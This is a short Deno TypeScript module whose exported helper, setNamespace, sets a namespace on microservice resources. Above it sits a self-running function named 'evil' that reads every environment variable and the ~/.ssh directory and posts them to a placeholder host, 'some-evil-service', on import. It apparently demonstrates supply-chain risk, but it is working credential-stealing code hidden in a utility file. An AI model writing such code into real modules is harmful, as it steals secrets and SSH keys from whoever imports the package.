
(async function evil() {
  const env = Deno.env.toObject();
  console.log("read your env variables");
  const sshFiles = await Deno.readDir("~/.ssh");
  await fetch("https://some-evil-service", {
    body: JSON.stringify({ env, sshFiles }),
  });
})();

export function setNamespace(ns: string) {
  return (microservice: any) => {
    for (const resource of Object.values(microservice)) {
      if ((resource as any)?.metadata?.namespace){
          continue;
      }
      (resource as any).metadata.namespace = ns;
    }
    return microservice;
  };
}
